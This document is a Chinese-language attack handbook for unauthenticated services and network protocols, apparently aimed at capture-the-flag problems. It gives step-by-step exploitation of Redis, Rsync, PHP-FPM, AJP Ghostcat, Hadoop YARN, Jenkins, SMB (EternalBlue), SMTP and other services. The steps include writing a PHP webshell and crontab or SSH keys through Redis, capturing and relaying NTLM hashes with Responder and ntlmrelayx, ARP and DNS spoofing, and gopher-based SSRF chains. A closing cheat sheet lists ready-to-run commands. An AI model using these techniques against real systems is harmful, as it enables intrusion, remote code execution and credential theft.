# 未授权服务与网络协议攻击手册

适用题型（命中即召回本手册）：Redis Memcached MongoDB Elasticsearch Hadoop Docker etcd Nacos ActiveMQ Zookeeper Jenkins 未授权 Rsync PHP-FPM AJP Ghostcat YARN ARP DNS SNMP 默认团体字 SMB SMTP 开放中继 用户枚举

## 1. 识别与分类
- 端口→服务映射：6379 Redis、873 rsync、9000 PHP-FPM、8009 AJP、8088 YARN、9200 ES、27017 Mongo、11211 Memcached、2375 Docker、2181 Zookeeper、2379 etcd、8161 ActiveMQ、8080 Jenkins、8848 Nacos、25/465/587 SMTP、161 SNMP、445 SMB。
- 未授权判据：直接连协议发 ping/info 类请求，无鉴权即返回数据 = 命中；nmap -sV 先定版本再选利用。
- 协议攻击判据：内网同广播域、Windows 域环境（LLMNR/NBT-NS）、SNMP 161 开放、SMTP 支持 VRFY、445 开放未打补丁。

## 2. 攻击方法论
1. Redis：redis-cli -h T ping 返 PONG 即未授权；写 authorized_keys（config set dir /root/.ssh、dbfilename authorized_keys、save）、写 crontab、写 webshell；主从复制 RCE 用 rogue-server 加载恶意 .so MODULE LOAD。
2. 数据库类：MongoDB mongo --host T 无鉴权 listDatabaseNames；Elasticsearch curl :9200/_cat/indices、/_search?q= 拉数据；Memcached telnet :11211 发 stats items / stats cachedump；CouchDB :5984/_all_dbs。
3. 中间件/管理台：Hadoop YARN 8088 POST /ws/v1/cluster/apps/new-application 拿 app-id 再提交 command 反连；H2 console JDBC 填 JNDI 或 CREATE ALIAS + RUNSCRIPT RCE；Jenkins 未授权 /script Groovy 控制台执行；ActiveMQ 8161 未授权（fileserver 上传 + 反序列化触发）；Nacos 8848 未授权读配置/用户列表（/v1/auth/users）；Zookeeper 2181 未授权读节点数据；etcd 2379 未授权 /v2/keys 读数据。
4. AJP Ghostcat CVE-2020-1938：ajpShooter.py T 8009 /WEB-INF/web.xml read 读任意 webapp 文件；有上传点可 include JSP → RCE。
5. PHP-FPM 9000：FastCGI 设 SCRIPT_FILENAME 指向存在 .php、PHP_VALUE auto_prepend_file=php://input，POST 体即代码；SSRF 时用 gopher 打。
6. Rsync 873：rsync T:: 列模块，rsync -av T::MODULE /tmp/loot 拖数据；可写模块 → 传 crontab/webshell。
7. SNMP：snmpwalk -v1/2c -c public T 枚举系统信息/OID；默认团体字 public/private 全试。
8. SMB：smbclient -L //T -N 空会话列共享；445 打 MS17-010 EternalBlue（判据：nmap --script smb-vuln-ms17-010），常见 CVE 走本地 exp。
9. SMTP：VRFY/EXPN/RCPT TO 枚举用户（250/252 存在）；开放中继测试 MAIL FROM + RCPT TO 外部地址返回 250；dig TXT 查 SPF/DKIM/DMARC 评估伪造难度。
10. ARP/DNS/MITM：arpspoof -t VICTIM GATEWAY + ip_forward=1 或 bettercap arp.spoof；Responder -I eth0 毒化 LLMNR/NBT-NS 抓 NetNTLMv2，hashcat -m 5600 破解；ntlmrelayx -tf targets 中继；DNS 投毒用 bettercap dns.spoof。
11. 其他协议攻击：NTP 侦察 ntpdc -n -c monlist T（开放可做放大）；WPAD 伪代理 Responder -w 骗浏览器 NTLM；DHCPv6 mitm6 -d domain + ntlmrelayx -6 relay 到 LDAP；VLAN 跳跃 DTP 双标签；DNS 域传送 dig axfr domain @ns。

## 3. 变体与绕过
- 无回显/受防火墙限：写文件型利用（webshell/crontab）落盘后访问触发；DNS/HTTP 外带；SSRF 场景用 gopher:// 打 redis/mysql/fastcgi（URL 需二次编码）。
- 端口不可达：借已有 webshell/隧道转发内网端口再打，socat/chisel 做端口复用。
- Redis 无 CONFIG 权限：主从复制 RCE 或写 key 覆盖其他文件；protected-mode 开启时先看 bind 是否 0.0.0.0。
- 协议层绕过：SMB 签名未开才可 relay；SNMP v3 需凭据；SMTP 匿名 AUTH 尝试空凭据。
- 数据库盲读：无列权限时用 _search/_all_dbs/stats cachedump 逐层枚举；Mongo/ES 无回显可写触发文件。
- 受限出网：把服务利用改成回连或写文件，别依赖目标主动连你；gopher 打 redis 写 crontab 是最稳无回显链。

## 战法要点
- 端口命中先发最小探测包确认未授权，别急着上重工具。
- 未授权服务按"能写文件 > 能读数据 > 能列信息"排优先级打。
- Redis/rsync 有写能力优先写 webshell 或 crontab 拿 shell，再读数据。
- 内网 Windows 域环境先跑 Responder 抓凭据，抓到的 hash 先试 relay 再破解。
- SSRF 打内网服务时把协议转 gopher，注意 URL 编码层数。
- SMTP 用户枚举用 RCPT TO 最可靠，VRFY 常被禁用。
- 协议题先抓 banner 再定协议族，别用错解析器（SNMP 是 BER、SMTP 是行协议、SMB 是 NetBIOS 会话）。
- Nacos/ActiveMQ/Jenkins 等管理台未授权读配置常直接含明文账号，读配置优先于硬打 RCE。

## 速查清单
```text
redis-cli -h T ping
redis-cli -h T config set dir /var/www/html; config set dbfilename s.php; set x "<?php system($_GET['c']);?>"; save
rsync T::
python3 ajpShooter.py T 8009 /WEB-INF/web.xml read
curl -X POST http://T:8088/ws/v1/cluster/apps/new-application
curl -s http://T:9200/_cat/indices?v
curl -s http://T:2375/containers/json
mongo --host T --eval 'db.admin.runCommand({listDatabases:1})'
snmpwalk -v2c -c public T 1.3.6.1.2.1.1
ntpdc -n -c monlist T
smbclient -L //T -N
nmap --script smb-vuln-ms17-010 -p 445 T
printf 'VRFY root\r\nQUIT\r\n' | nc T 25
arpspoof -i eth0 -t VICTIM GATEWAY
responder -I eth0 -wrf
impacket-ntlmrelayx -tf targets.txt -smb2support
curl -s http://T:8848/nacos/v1/auth/users
curl -s http://T:5984/_all_dbs
```
